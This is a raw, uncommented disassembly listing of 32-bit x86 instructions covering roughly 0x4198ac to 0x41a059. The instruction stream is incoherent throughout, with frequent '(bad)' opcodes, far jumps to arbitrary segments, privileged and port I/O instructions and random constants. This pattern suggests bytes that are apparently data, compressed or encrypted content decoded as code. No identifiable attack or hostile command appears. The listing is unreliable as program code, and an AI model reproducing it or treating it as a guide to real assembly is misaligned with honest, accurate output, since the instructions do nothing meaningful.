  4198ac:	bound  edi,QWORD PTR [eax-0x3c04712]
  4198b2:	mov    ebx,0xdab0b4ab
  4198b7:	jmp    0x41991f
  4198b9:	(bad)  
  4198ba:	cli    
  4198bb:	fidiv  WORD PTR [edi]
  4198bd:	pop    edi
  4198be:	lods   al,BYTE PTR ds:[esi]
  4198bf:	mov    edi,0x9d161aad
  4198c4:	dec    edx
  4198c5:	sbb    bh,BYTE PTR [eax+ebx*8]
  4198c8:	mov    DWORD PTR [edx+0x58],esi
  4198cb:	test   bl,dl
  4198cd:	mov    esp,?
  4198cf:	rcl    BYTE PTR [ebx],0x66
  4198d2:	pop    ebx
  4198d3:	mov    edi,0x6775bd05
  4198d8:	outs   dx,DWORD PTR ds:[esi]
  4198d9:	sbb    BYTE PTR [eax+0x63],ah
  4198dc:	xchg   ecx,eax
  4198dd:	inc    esp
  4198de:	cmp    ebx,eax
  4198e0:	fs popa 
  4198e2:	sub    al,0x8f
  4198e4:	dec    edx
  4198e5:	jmp    0xcd53:0x9d825108
  4198ec:	clc    
  4198ed:	fsubr  DWORD PTR [ebp-0x1c]
  4198f0:	mov    edi,0xd9f5cef7
  4198f5:	dec    ebp
  4198f6:	cwde   
  4198f7:	xchg   edx,eax
  4198f8:	rcl    BYTE PTR [ecx+ecx*2],0xeb
  4198fc:	fs mov dl,0x95
  4198ff:	shl    DWORD PTR [eax-0x52134f9a],1
  419905:	mov    eax,ds:0x40f1181f
  41990a:	shl    BYTE PTR [ebx-0x234249a8],0x97
  419911:	popa   
  419912:	(bad)  
  419913:	jl     0x41997e
  419915:	outs   dx,DWORD PTR ds:[esi]
  419916:	lods   al,BYTE PTR ds:[esi]
  419917:	sbb    esi,DWORD PTR [ebx-0x2412aa48]
  41991d:	ins    DWORD PTR es:[edi],dx
  41991e:	push   ss
  41991f:	cmp    DWORD PTR [eax-0x28],edi
  419922:	shr    BYTE PTR ss:[ecx+0x11b67401],0x7f
  41992a:	(bad)  
  41992c:	fbld   TBYTE PTR [ebp+0x6c]
  41992f:	inc    edx
  419930:	fs (bad) 
  419932:	jno    0x419941
  419934:	inc    ebp
  419935:	and    ebx,DWORD PTR [ecx]
  419937:	aas    
  419938:	in     al,dx
  419939:	ret    0xebb1
  41993c:	mov    cl,0x32
  41993e:	lahf   
  41993f:	mov    ss,WORD PTR [ebp-0x4c]
  419942:	cli    
  419943:	pop    eax
  419944:	mov    ecx,?
  419946:	pop    eax
  419947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419948:	mov    bh,0x87
  41994a:	ins    DWORD PTR es:[edi],dx
  41994b:	cmp    DWORD PTR [ebx],eax
  41994d:	test   DWORD PTR [edi+0x33],esi
  419950:	pop    edx
  419951:	pushf  
  419952:	jo     0x4199af
  419954:	dec    edx
  419955:	pop    ebx
  419956:	add    eax,0x6189a1d3
  41995b:	jnp    0x4199cb
  41995d:	fst    QWORD PTR [edi-0x70c61144]
  419963:	dec    esi
  419964:	loope  0x41999f
  419966:	call   0xe66e:0xad0bb05c
  41996d:	xor    DWORD PTR [esi-0x290351d3],edx
  419973:	in     al,dx
  419974:	(bad)  
  419975:	(bad)  
  419976:	retf   0xc809
  419979:	(bad)  
  41997a:	xlat   BYTE PTR ds:[ebx]
  41997b:	out    0x4d,al
  41997d:	ins    BYTE PTR es:[edi],dx
  41997e:	cmp    DWORD PTR [edi-0x23201e0e],ebx
  419984:	in     eax,0x4c
  419986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419987:	cmp    ch,BYTE PTR [eax+0x191e8a8c]
  41998d:	lock aaa 
  41998f:	cwde   
  419990:	xchg   edx,eax
  419991:	loope  0x4199da
  419993:	adc    DWORD PTR [edx-0x22],esp
  419996:	cmp    esp,DWORD PTR [edi-0x21019dd]
  41999c:	inc    eax
  41999d:	inc    ebx
  41999e:	in     eax,dx
  41999f:	cs addr16 dec edx
  4199a2:	mov    bh,0x3b
  4199a4:	xlat   BYTE PTR ds:[ebx]
  4199a5:	dec    esp
  4199a6:	ins    BYTE PTR es:[edi],dx
  4199a7:	mov    dh,0x26
  4199a9:	add    al,0x28
  4199ab:	push   edi
  4199ac:	pop    edx
  4199ad:	ins    BYTE PTR es:[edi],dx
  4199ae:	mov    bh,0xa6
  4199b0:	stc    
  4199b1:	jl     0x4199ee
  4199b3:	jp     0x4199b9
  4199b5:	int3   
  4199b6:	dec    eax
  4199b7:	xor    DWORD PTR [ebx],edi
  4199b9:	nop
  4199ba:	or     cl,BYTE PTR [ecx+esi*4-0x6be9978b]
  4199c1:	mov    ds:0x586fd646,eax
  4199c6:	inc    esi
  4199c7:	jnp    0x4199e3
  4199c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199ca:	jo     0x419a47
  4199cc:	pop    eax
  4199cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199ce:	push   edi
  4199cf:	mov    ebx,0xf9dadb4f
  4199d4:	xlat   BYTE PTR ds:[ebx]
  4199d5:	jmp    DWORD PTR [edi+0x23]
  4199d8:	mov    eax,ds:0x11d512a0
  4199dd:	jmp    0x7cc0:0xbe1a33ee
  4199e4:	inc    ebp
  4199e5:	or     DWORD PTR [esi],esi
  4199e7:	xor    edx,DWORD PTR [eax+0x1cdd1ba]
  4199ed:	fdivr  st(3),st
  4199ef:	repnz pop ebp
  4199f1:	fld    QWORD PTR [ecx+0x58]
  4199f4:	stos   DWORD PTR es:[edi],eax
  4199f5:	adc    BYTE PTR [edi],0xfa
  4199f8:	or     al,0x4c
  4199fa:	add    edx,DWORD PTR [esi+0x47]
  4199fd:	sbb    bh,ch
  4199ff:	jbe    0x4199f8
  419a01:	loopne 0x41999f
  419a03:	(bad)  
  419a04:	fs pop es
  419a06:	mov    eax,ds:0x5a375c68
  419a0b:	cmp    DWORD PTR [eax],edi
  419a0d:	jl     0x419a3c
  419a0f:	stc    
  419a10:	xchg   ecx,esi
  419a12:	sbb    ecx,DWORD PTR [ebp+edx*4+0x116ca704]
  419a19:	xlat   BYTE PTR ds:[ebx]
  419a1a:	push   esp
  419a1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a1c:	xor    DWORD PTR [ecx-0x194fd33b],0x7376b6ab
  419a26:	xor    al,0x9
  419a28:	int    0xc6
  419a2a:	xchg   BYTE PTR [ebx-0x31383de5],dl
  419a30:	mov    dl,bl
  419a32:	in     al,0x2d
  419a34:	mov    ebp,edx
  419a36:	mov    ebp,0xba9e2b61
  419a3b:	push   ds
  419a3c:	test   DWORD PTR [eax+0x8],edx
  419a3f:	pushf  
  419a40:	fidiv  DWORD PTR [eax]
  419a42:	or     eax,0xe090e1cd
  419a47:	pop    ds
  419a48:	push   ebp
  419a49:	(bad)  
  419a4a:	out    dx,al
  419a4b:	pop    edx
  419a4c:	retf   0xcf97
  419a4f:	mov    eax,0xeb6bc68c
  419a54:	pop    ss
  419a55:	in     al,0x9a
  419a57:	imul   ebp,DWORD PTR [eax],0xe
  419a5a:	ja     0x419a44
  419a5c:	stc    
  419a5d:	clc    
  419a5e:	mov    dl,0xd4
  419a60:	pop    edi
  419a61:	xor    DWORD PTR [ecx-0x5f],edx
  419a64:	xor    BYTE PTR [edi-0xbe17c96],0x2c
  419a6b:	xchg   edi,eax
  419a6c:	(bad)  
  419a6d:	sbb    esp,esi
  419a6f:	data16 (bad) 
  419a71:	aaa    
  419a72:	jl     0x419a04
  419a74:	mov    eax,0xb1bb9832
  419a79:	arpl   WORD PTR [esi-0x6b766de1],bx
  419a7f:	sub    dh,al
  419a81:	inc    eax
  419a82:	push   eax
  419a83:	pop    ecx
  419a84:	sbb    eax,DWORD PTR [ebp+0x2bd3cb34]
  419a8a:	pop    esi
  419a8b:	push   ebp
  419a8c:	mov    edx,0x8244f4e4
  419a91:	inc    edi
  419a92:	(bad)  
  419a94:	sub    DWORD PTR [edx+0x55],ebp
  419a97:	xor    bh,BYTE PTR [edi-0x4fa4c0e]
  419a9d:	clc    
  419a9e:	std    
  419a9f:	pop    edx
  419aa0:	push   0x59c66023
  419aa5:	adc    al,BYTE PTR [ebp-0x15]
  419aa8:	adc    eax,0x616d5431
  419aad:	fs ins DWORD PTR es:[edi],dx
  419aaf:	or     DWORD PTR [ebx-0x5378859c],0xffffffe5
  419ab6:	sub    BYTE PTR [ebx],dh
  419ab8:	add    ah,BYTE PTR [ecx+0x1828055e]
  419abe:	push   cs
  419abf:	pushf  
  419ac0:	and    dh,bh
  419ac2:	inc    esi
  419ac3:	inc    ecx
  419ac4:	mov    esi,0x432642f7
  419ac9:	sub    dl,BYTE PTR [eax]
  419acb:	fstp   TBYTE PTR [ecx]
  419acd:	and    edx,edx
  419acf:	inc    ebx
  419ad1:	enter  0xbe75,0xbf
  419ad5:	jns    0x419b14
  419ad7:	xor    ah,ch
  419ad9:	fmul   DWORD PTR [edx+0x6c17e951]
  419adf:	fstp   QWORD PTR [esi+eiz*1-0x76]
  419ae3:	int3   
  419ae4:	in     eax,dx
  419ae5:	sbb    bl,BYTE PTR [edi-0xdedd6b2]
  419aeb:	dec    esi
  419aec:	fwait
  419aed:	xor    al,BYTE PTR [ecx+ebx*1-0x88b7fce]
  419af4:	pop    ss
  419af5:	xor    cl,BYTE PTR [eax-0x11]
  419af8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419af9:	mov    ds:0xbfcae682,eax
  419afe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419aff:	jae    0x419ace
  419b01:	cmp    edi,DWORD PTR [edx+ebp*4+0x1bc55cd3]
  419b08:	pop    edx
  419b09:	dec    BYTE PTR [edx]
  419b0b:	xchg   dh,dh
  419b0d:	hlt    
  419b0e:	jl     0x419ad4
  419b10:	mov    esi,ebp
  419b12:	add    DWORD PTR ds:0x96fc775,0xafd15b06
  419b1c:	into   
  419b1d:	test   DWORD PTR [eax-0x75],eax
  419b20:	push   cs
  419b21:	dec    edi
  419b22:	jp     0x419b67
  419b24:	push   es
  419b25:	sbb    eax,0xbe1d584
  419b2a:	aad    0xe6
  419b2c:	jmp    0x25bc:0x9c03c850
  419b33:	jnp    0x419b71
  419b35:	mov    DWORD PTR [edx-0x56],0xf681ab9
  419b3c:	aas    
  419b3d:	out    dx,al
  419b3e:	lods   al,BYTE PTR ds:[esi]
  419b3f:	mov    cl,0x63
  419b41:	mov    ebp,DWORD PTR [esi]
  419b43:	sub    eax,0xd1840ee
  419b48:	cmp    ecx,DWORD PTR [ebx+0xf]
  419b4b:	cmp    BYTE PTR [esi-0x33],0xaa
  419b4f:	xchg   DWORD PTR [edx+0x6d],eax
  419b52:	add    al,dl
  419b54:	sti    
  419b55:	pop    esp
  419b56:	mov    cl,0x8b
  419b58:	xor    BYTE PTR [esi+0x4d4532ae],dh
  419b5e:	jmp    0xe608a585
  419b63:	mov    edx,0x2554eb82
  419b68:	sub    esp,DWORD PTR [ebp+0x6d4a7c33]
  419b6e:	pop    ecx
  419b6f:	(bad)  
  419b71:	mov    edi,0x7e79b881
  419b76:	mov    esp,?
  419b78:	push   ecx
  419b79:	adc    eax,0xc3812b29
  419b7e:	fistp  DWORD PTR [esi-0x698332e9]
  419b84:	xor    edx,edi
  419b86:	push   edi
  419b87:	xchg   edi,eax
  419b88:	pop    edx
  419b89:	push   esi
  419b8a:	push   es
  419b8b:	inc    esi
  419b8c:	mov    al,ds:0x89453061
  419b91:	outs   dx,DWORD PTR ds:[esi]
  419b92:	xchg   ebx,eax
  419b93:	arpl   si,sp
  419b95:	or     eax,0x567ce9b1
  419b9a:	(bad)  [edx+edi*4]
  419b9d:	fs mov ebx,0xb1a368cf
  419ba3:	xor    eax,0x9d3d9875
  419ba8:	into   
  419ba9:	jnp    0x419b86
  419bab:	and    bh,BYTE PTR [ebx+0x60187f89]
  419bb1:	push   0xffa2ee82
  419bb6:	mov    al,0x99
  419bb8:	cmp    al,0xf5
  419bba:	pop    esp
  419bbb:	lds    edi,FWORD PTR [ecx-0x47]
  419bbe:	cld    
  419bbf:	jge    0x419bfc
  419bc1:	call   0xbed6:0x9be282ba
  419bc8:	in     eax,dx
  419bc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bca:	std    
  419bcb:	sbb    edx,DWORD PTR [eax]
  419bcd:	jge    0x419be2
  419bcf:	outs   dx,DWORD PTR ds:[esi]
  419bd0:	mov    cl,0x74
  419bd2:	fcomp  DWORD PTR ds:0xd5c22d50
  419bd8:	adc    BYTE PTR [ecx+edx*1],al
  419bdb:	xchg   ebx,eax
  419bdc:	sub    al,0x5c
  419bde:	das    
  419bdf:	jg     0x419bcb
  419be1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419be2:	add    ebx,ebp
  419be4:	jecxz  0x419b6f
  419be6:	jb     0x419c16
  419be8:	sbb    BYTE PTR [esi],al
  419bea:	fs inc esi
  419bec:	repz in al,0xfc
  419bef:	pop    ds
  419bf0:	pushf  
  419bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bf2:	cld    
  419bf3:	xor    cl,ah
  419bf5:	shl    BYTE PTR [esi],1
  419bf7:	fisttp QWORD PTR [ebp+0x0]
  419bfa:	push   edi
  419bfb:	leave  
  419bfc:	sbb    DWORD PTR [esi],ebx
  419bfe:	call   0x462d653
  419c03:	retf   0x6ef8
  419c06:	xchg   esi,eax
  419c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c08:	es int 0xf4
  419c0b:	dec    eax
  419c0c:	pop    gs
  419c0e:	int3   
  419c0f:	adc    edi,ebx
  419c11:	xchg   ah,ch
  419c13:	nop
  419c14:	mov    edx,0x5a263b3d
  419c19:	retf   
  419c1a:	push   ebp
  419c1b:	(bad)  
  419c1c:	xlat   BYTE PTR ds:[ebx]
  419c1d:	icebp  
  419c1e:	and    BYTE PTR [eax+0x772bf3b7],ah
  419c24:	test   eax,0x7a550de7
  419c29:	or     DWORD PTR [ebx-0x9],ecx
  419c2c:	xchg   edx,eax
  419c2d:	lods   al,BYTE PTR ds:[esi]
  419c2e:	dec    ebx
  419c2f:	xor    BYTE PTR [esi+ebx*8],ah
  419c32:	(bad)  [esi+0x1c]
  419c35:	neg    DWORD PTR [esp+ebp*8]
  419c38:	xchg   edx,eax
  419c39:	mov    ?,WORD PTR [eax]
  419c3b:	frstor [eax+0x793130be]
  419c41:	adc    BYTE PTR [ecx+edx*8],dl
  419c44:	pop    esp
  419c45:	xor    eax,0xa20b1ca2
  419c4a:	aad    0x26
  419c4c:	fistp  WORD PTR [ecx-0x6]
  419c4f:	ror    cl,1
  419c51:	shl    ecx,0xff
  419c54:	xchg   edi,eax
  419c55:	xchg   bl,bl
  419c57:	mov    ah,0x7
  419c59:	call   0x46ac6ffc
  419c5e:	mov    esi,0x2a02d07e
  419c63:	mov    al,0x5e
  419c65:	or     al,0x66
  419c67:	dec    edi
  419c68:	outs   dx,DWORD PTR ds:[esi]
  419c69:	jns    0x419ccb
  419c6b:	(bad)  
  419c6c:	hlt    
  419c6d:	call   0x8fe:0x871dc961
  419c74:	in     al,dx
  419c75:	std    
  419c76:	cmc    
  419c77:	push   eax
  419c78:	cdq    
  419c79:	inc    ebp
  419c7a:	test   DWORD PTR [eax+0x4a],esi
  419c7d:	and    DWORD PTR [esi+0x2636e22e],0xc483acc1
  419c87:	sub    BYTE PTR [ebx-0x4],0xcb
  419c8b:	and    al,0xe5
  419c8d:	test   al,0xc0
  419c8f:	cmp    BYTE PTR [ebx+0x3],bh
  419c92:	push   ebp
  419c93:	imul   ebx,DWORD PTR [ecx+0x7f67583a],0xad489168
  419c9d:	sub    bh,bh
  419c9f:	dec    esi
  419ca0:	push   eax
  419ca1:	in     eax,0x4b
  419ca3:	test   BYTE PTR gs:[ebp+0x65c300ec],dl
  419caa:	test   DWORD PTR [edi+0x77fa2aa9],edx
  419cb0:	fwait
  419cb1:	dec    eax
  419cb2:	das    
  419cb3:	inc    esi
  419cb4:	cmp    ecx,DWORD PTR [ebx+0x70]
  419cb7:	cmp    ebp,DWORD PTR [ebp-0x655e9ca8]
  419cbd:	add    al,0xcb
  419cbf:	pop    esp
  419cc0:	and    al,BYTE PTR [esi]
  419cc2:	sub    eax,0x42025ba0
  419cc7:	clc    
  419cc8:	push   ebx
  419cc9:	das    
  419cca:	test   BYTE PTR cs:[eax+0x38f32e8a],dl
  419cd1:	hlt    
  419cd2:	push   edi
  419cd4:	scas   al,BYTE PTR es:[edi]
  419cd5:	push   esp
  419cd6:	test   eax,0xfe9f4c71
  419cdb:	cli    
  419cdc:	ret    
  419cdd:	and    dl,dl
  419cdf:	pop    ss
  419ce0:	mov    cl,0xb2
  419ce2:	aaa    
  419ce3:	adc    al,0x2a
  419ce5:	xchg   ebp,eax
  419ce6:	cmp    DWORD PTR [edx],ebp
  419ce8:	sub    eax,0x831530cd
  419ced:	ror    BYTE PTR [ebp+ebp*4-0x46],0xc1
  419cf2:	imul   BYTE PTR [edx-0x2acf1cdf]
  419cf8:	sbb    ah,bh
  419cfa:	or     esp,edi
  419cfc:	sbb    eax,0x668afcb2
  419d01:	loopne 0x419cee
  419d03:	add    dl,BYTE PTR [edi+0x17]
  419d06:	scas   al,BYTE PTR es:[edi]
  419d07:	jnp    0x419d3f
  419d09:	clc    
  419d0a:	mov    cl,0xe0
  419d0c:	xor    eax,0xe2
  419d11:	add    BYTE PTR [eax-0x329b3fbb],cl
  419d17:	in     eax,0xac
  419d19:	in     eax,dx
  419d1a:	or     dh,BYTE PTR [ebp+0x7e38077c]
  419d20:	adc    al,BYTE PTR [esi-0x2f]
  419d23:	sbb    DWORD PTR [ecx],eax
  419d25:	add    ah,dh
  419d27:	add    al,0x0
  419d29:	add    BYTE PTR [ebx],dh
  419d2b:	add    dl,BYTE PTR [eax]
  419d2d:	inc    eax
  419d2e:	push   es
  419d2f:	dec    esi
  419d30:	jmp    0xb3a02776
  419d35:	push   ecx
  419d36:	and    cl,bl
  419d38:	push   esi
  419d39:	add    al,BYTE PTR [edx+0x501356ec]
  419d3f:	jo     0x419d1e
  419d41:	push   edi
  419d42:	adc    al,0x9e
  419d44:	xor    cl,bl
  419d46:	sbb    BYTE PTR [ecx],0x8d
  419d49:	mov    ds:0xb005df5,al
  419d4e:	imul   eax,DWORD PTR [edx+0x7a42d577],0x8f684762
  419d58:	xor    cl,dl
  419d5a:	dec    ebx
  419d5b:	js     0x419d31
  419d5d:	pusha  
  419d5e:	or     ebp,DWORD PTR [ebx-0x2efaf295]
  419d64:	retf   0x999e
  419d67:	cmp    BYTE PTR [ebx-0x60],dh
  419d6a:	pop    ss
  419d6b:	gs adc esi,eax
  419d6e:	bound  esp,QWORD PTR [edx-0x5b688300]
  419d74:	mov    eax,ds:0x4f3ed899
  419d79:	jmp    0xd805:0x42b5fd4c
  419d80:	sub    DWORD PTR ds:0xc61f417c,edx
  419d86:	ins    DWORD PTR es:[edi],dx
  419d87:	pop    es
  419d88:	(bad)  
  419d89:	add    dh,ah
  419d8b:	sbb    BYTE PTR [ebp+0x46],bh
  419d8e:	or     eax,0xbe381c03
  419d93:	es push ebx
  419d95:	cmp    BYTE PTR [eax+0x3],0xb8
  419d99:	dec    esp
  419d9a:	retf   0x70e2
  419d9d:	pop    esp
  419d9e:	inc    esp
  419d9f:	cmovl  eax,DWORD PTR [ebx-0x75]
  419da3:	xchg   esi,eax
  419da4:	sbb    dh,dl
  419da6:	stos   DWORD PTR es:[edi],eax
  419da7:	repz rol BYTE PTR [ebp+0x14d8d9c],1
  419dae:	push   es
  419daf:	and    al,0x8f
  419db1:	cdq    
  419db2:	adc    eax,0x895bd54
  419db7:	sub    ecx,DWORD PTR [esi+0x3c]
  419dba:	or     ch,dl
  419dbc:	je     0x419daf
  419dbe:	jl     0x419df4
  419dc0:	xor    eax,0xb51a7c7e
  419dc5:	(bad)  
  419dc6:	test   DWORD PTR [ebp+0x3e],0x606fc11c
  419dcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dce:	test   esi,0x9fc46d01
  419dd4:	mov    bl,0x56
  419dd6:	leave  
  419dd7:	xlat   BYTE PTR ds:[ebx]
  419dd8:	cwde   
  419dd9:	sbb    al,0xd4
  419ddb:	hlt    
  419ddc:	adc    bl,BYTE PTR [ebp+0xc]
  419ddf:	dec    esp
  419de0:	jno    0x419e22
  419de2:	jnp    0x419d92
  419de4:	mov    BYTE PTR ds:[edi+eax*2-0x13f489e2],ch
  419dec:	fsubr  st,st(5)
  419dee:	mov    al,ds:0x80303238
  419df3:	mov    ah,0xc9
  419df5:	mov    dh,0x88
  419df7:	mov    edi,eax
  419df9:	fdivrp st(7),st
  419dfb:	in     eax,dx
  419dfc:	mov    esp,0x6272fdd9
  419e01:	hlt    
  419e02:	js     0x419df9
  419e04:	mov    WORD PTR [esi+0x2d],ss
  419e07:	or     eax,0xe5c46f45
  419e0c:	js     0x419dd7
  419e0e:	xor    ch,BYTE PTR [edi]
  419e10:	pushf  
  419e11:	mov    edi,0xb40d2266
  419e16:	std    
  419e17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e18:	pop    ss
  419e19:	call   0x8015:0xc2d5b707
  419e20:	ss xchg edx,eax
  419e22:	dec    eax
  419e23:	mov    ebp,0x2e8e0b79
  419e28:	mov    DWORD PTR [esi],esi
  419e2a:	(bad)  
  419e2b:	ss ja  0x419ea8
  419e2e:	or     BYTE PTR [edx],0x23
  419e31:	imul   eax,DWORD PTR [edx-0x78f103d],0xffffff98
  419e38:	hlt    
  419e39:	or     al,BYTE PTR [ebp+esi*2-0xe4f5e74]
  419e40:	or     BYTE PTR [esi-0x4d],bh
  419e43:	xor    ebp,DWORD PTR [eax-0x17d3fc0f]
  419e49:	push   ds
  419e4a:	ret    
  419e4b:	outs   dx,DWORD PTR ds:[esi]
  419e4c:	sub    DWORD PTR [edi-0x1e7eec16],esi
  419e52:	add    al,0x8b
  419e54:	push   0x4a
  419e56:	shl    ebp,cl
  419e58:	push   0x89d05a51
  419e5d:	adc    eax,0xb42ce30f
  419e62:	pop    ss
  419e63:	shr    DWORD PTR [ebp+0xd6d11eb],1
  419e69:	retf   0x2edd
  419e6c:	pop    edx
  419e6d:	fsubr  QWORD PTR [edi]
  419e6f:	jb     0x419e1e
  419e71:	dec    esp
  419e72:	mov    ecx,0xbf6510ab
  419e77:	dec    edi
  419e78:	out    dx,eax
  419e79:	jne    0x419e94
  419e7b:	mov    eax,ds:0x1431e7f0
  419e80:	xlat   BYTE PTR ds:[ebx]
  419e81:	and    al,0xab
  419e83:	loop   0x419f00
  419e85:	ins    DWORD PTR es:[edi],dx
  419e86:	popa   
  419e87:	das    
  419e88:	stos   BYTE PTR es:[edi],al
  419e89:	(bad)  
  419e8a:	clc    
  419e8b:	cld    
  419e8c:	retf   
  419e8d:	clc    
  419e8e:	js     0x419e4e
  419e90:	test   DWORD PTR [esi-0x373dbfba],edi
  419e96:	dec    ebx
  419e97:	push   eax
  419e98:	cmp    eax,0x814eaf6b
  419e9d:	mov    ds:0xfeb13824,eax
  419ea2:	add    ch,BYTE PTR [edx]
  419ea4:	mov    eax,ds:0x897ec78c
  419ea9:	loope  0x419e36
  419eab:	test   al,0xfb
  419ead:	push   edx
  419eae:	call   0x95df81d3
  419eb3:	mov    esp,DWORD PTR [esi]
  419eb5:	mov    bh,0xe
  419eb7:	dec    edx
  419eb8:	cli    
  419eb9:	mov    ds:0xb76767b5,eax
  419ebe:	mov    dh,0x96
  419ec0:	sbb    BYTE PTR [eax-0x19],al
  419ec3:	dec    edx
  419ec4:	pop    eax
  419ec5:	pushf  
  419ec6:	popf   
  419ec7:	mov    eax,ds:0x43b3eb84
  419ecc:	fistp  QWORD PTR [edx]
  419ece:	lods   eax,DWORD PTR ds:[esi]
  419ecf:	sub    eax,0xcbfe92ab
  419ed4:	test   DWORD PTR [edi+0x54],ebp
  419ed7:	pop    eax
  419ed8:	leave  
  419ed9:	fsin   
  419edb:	mov    ecx,0x223bfe92
  419ee0:	sbb    BYTE PTR [ebx+0x6a],ah
  419ee3:	lds    ebp,FWORD PTR [edx-0x57]
  419ee6:	cmp    DWORD PTR [edx+0x23],eax
  419ee9:	mov    bl,0x54
  419eeb:	lahf   
  419eec:	mov    dl,0xbb
  419eee:	addr16 aad 0x3b
  419ef1:	ins    DWORD PTR es:[edi],dx
  419ef2:	adc    dh,ch
  419ef4:	arpl   WORD PTR [ebx+0x14],dx
  419ef7:	nop
  419ef8:	push   ebp
  419ef9:	push   ss
  419efa:	add    al,dl
  419efc:	pop    eax
  419efd:	xchg   ebp,eax
  419efe:	or     esi,ebx
  419f00:	pop    eax
  419f01:	lods   al,BYTE PTR ds:[esi]
  419f02:	fiadd  DWORD PTR [edx]
  419f04:	into   
  419f05:	and    eax,0x76df4a6f
  419f0a:	mov    eax,ds:0xd3a1a0c3
  419f0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f10:	dec    edx
  419f11:	ret    
  419f12:	sti    
  419f13:	fisub  WORD PTR [esi]
  419f15:	jmp    0x4b511de9
  419f1a:	mov    al,ds:0x415a5adc
  419f1f:	jle    0x419f53
  419f21:	shl    BYTE PTR [ebx],1
  419f23:	lods   eax,DWORD PTR ds:[esi]
  419f24:	dec    ecx
  419f25:	loop   0x419f93
  419f27:	sbb    BYTE PTR [ecx-0x63],ah
  419f2a:	inc    cx
  419f2c:	in     al,0x6b
  419f2e:	inc    ecx
  419f2f:	test   al,0xc3
  419f31:	adc    al,0x98
  419f33:	cmc    
  419f34:	pop    ebp
  419f35:	gs (bad) 
  419f37:	pop    edx
  419f38:	(bad)  
  419f39:	scas   eax,DWORD PTR es:[edi]
  419f3a:	add    DWORD PTR ds:0x13413b7c,ecx
  419f40:	mov    cl,0x9c
  419f42:	mov    ch,cl
  419f44:	sbb    DWORD PTR [ecx+ebx*4+0x4b6a86d1],ecx
  419f4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f4c:	or     DWORD PTR [edi+eax*4-0x58523481],edi
  419f53:	xchg   edi,ebx
  419f55:	jo     0x419f35
  419f57:	js     0x54cfdc4
  419f5d:	aas    
  419f5e:	(bad)  
  419f5f:	enter  0xe534,0x9e
  419f63:	inc    eax
  419f64:	out    dx,eax
  419f65:	in     eax,0x40
  419f67:	push   ds
  419f68:	shl    dl,0xe9
  419f6b:	sar    BYTE PTR [eax-0x35],1
  419f6e:	out    dx,al
  419f6f:	sbb    esp,edx
  419f71:	xchg   ah,al
  419f73:	push   0xfb3def6d
  419f78:	bnd ja 0x419f9b
  419f7b:	push   edi
  419f7c:	jne    0x419f32
  419f7e:	add    eax,0x235403a7
  419f83:	sub    BYTE PTR [ebp-0x2d],cl
  419f86:	shr    DWORD PTR ds:0x6259c9a7,1
  419f8c:	bound  ecx,QWORD PTR [ecx-0x5e820eb2]
  419f92:	(bad)  
  419f93:	xor    DWORD PTR [ebp+0xd],esi
  419f96:	lahf   
  419f97:	enter  0x6c95,0x4d
  419f9b:	aad    0x33
  419f9d:	xchg   edx,eax
  419f9e:	fs jmp 0xc99e45ff
  419fa4:	in     al,0x61
  419fa6:	fwait
  419fa7:	push   ecx
  419fa8:	daa    
  419fa9:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  419fab:	pop    ds
  419fac:	aam    0x98
  419fae:	test   eax,0xe33cbcc7
  419fb3:	and    ebp,0x3f
  419fb6:	cwde   
  419fb7:	fsubrp st(0),st
  419fb9:	mov    bh,0x97
  419fbb:	fwait
  419fbc:	add    BYTE PTR [eax-0x53],cl
  419fbf:	jnp    0x419f5c
  419fc1:	cmp    edx,edx
  419fc3:	sub    eax,0xc7e7d7a2
  419fc8:	test   DWORD PTR [ecx],0xd96a253c
  419fce:	sbb    DWORD PTR [edx+0x79175ba7],ebx
  419fd4:	sub    eax,0xa5c7b896
  419fd9:	ret    0xaa96
  419fdc:	xchg   edx,eax
  419fdd:	push   0xffffffff
  419fdf:	push   ebp
  419fe0:	pop    esi
  419fe1:	enter  0xa890,0x3f
  419fe5:	cmc    
  419fe6:	mov    esp,0x5e8b2ace
  419feb:	sahf   
  419fec:	mov    al,0x20
  419fee:	inc    ebp
  419fef:	push   esp
  419ff0:	int3   
  419ff1:	lahf   
  419ff2:	and    edi,DWORD PTR [ebx-0x63]
  419ff5:	cmp    eax,0xfb80f336
  419ffa:	jo     0x41a06b
  419ffc:	push   ebp
  419ffd:	nop
  419ffe:	push   esi
  419fff:	leave  
  41a000:	push   DWORD PTR [edi+0x1d2fc62d]
  41a006:	xchg   edx,eax
  41a007:	cld    
  41a008:	and    edx,DWORD PTR [edx-0x11]
  41a00b:	push   esp
  41a00c:	ins    WORD PTR es:[edi],dx
  41a00e:	ret    
  41a00f:	push   0xffffff99
  41a011:	sbb    al,BYTE PTR [eax+0x48]
  41a014:	mov    edx,0x8e301cab
  41a019:	add    BYTE PTR [ecx+eax*8],dl
  41a01c:	xor    eax,0xe4bd70a9
  41a021:	mov    ebx,0xfc62e1a3
  41a026:	sahf   
  41a027:	mov    cl,0x6e
  41a029:	idiv   edx
  41a02b:	cs push edx
  41a02d:	dec    ecx
  41a02e:	push   cs
  41a02f:	mov    ecx,DWORD PTR [ecx+0x7473b86d]
  41a035:	add    BYTE PTR [edx+edx*1-0x39af244f],0x6d
  41a03d:	(bad)  
  41a03e:	out    0x6b,al
  41a040:	jb     0x419fe2
  41a042:	rol    BYTE PTR [edi-0x67abf9e6],1
  41a048:	pop    ebx
  41a049:	adc    DWORD PTR [ebx-0x5e59d4c4],eax
  41a04f:	repnz or DWORD PTR [ebp+0x1e466a95],0xffffffdd
  41a057:	push   ss
  41a058:	pop    esi
  41a059:	mov    edi,0xae93c610
